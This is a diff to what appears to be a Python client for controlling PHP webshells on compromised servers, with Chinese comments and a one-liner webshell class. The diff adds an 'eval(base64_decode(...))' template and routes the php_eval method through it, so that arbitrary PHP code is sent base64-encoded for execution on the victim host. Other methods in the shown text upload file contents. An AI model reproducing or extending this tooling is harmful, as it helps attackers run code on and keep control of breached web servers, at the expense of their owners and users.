@@ -172,6 +172,10 @@ ob_end_clean();
 echo base64_encode($content);
 """
 
+EVAL_PHP = """
+eval(base64_decode({code_b64}));
+"""
+
 PAYLOAD_SESSIONIZE = """
 $b64_part = 'B64_PART';
 if(!$_SESSION['PAYLOAD_STORE']) {
@@ -360,9 +364,7 @@ class PHPWebshell(PHPSessionInterface):
             raise exceptions.FileError(f"文件大小太大(>{max_size}B)，建议下载编辑")
         return base64.b64decode(result)
 
-    async def put_file_contents(
-        self, filepath: str, content: bytes
-    ) -> bool:
+    async def put_file_contents(self, filepath: str, content: bytes) -> bool:
         php_code = PUT_FILE_CONTENT_PHP.replace("FILE_PATH", repr(filepath)).replace(
             "FILE_CONTENT", repr(base64_encode(content))
         )
@@ -489,8 +491,9 @@ class PHPWebshell(PHPSessionInterface):
         raise NotImplementedError("这个函数应该由实际的实现override")
 
     async def php_eval(self, code: str) -> str:
-        result = await self.submit(code)
+        result = await self.submit(EVAL_PHP.format(code_b64=repr(base64_encode(code))))
         return result
+
 
 class PHPWebshellOneliner(PHPWebshell):
     """一句话的php webshell"""
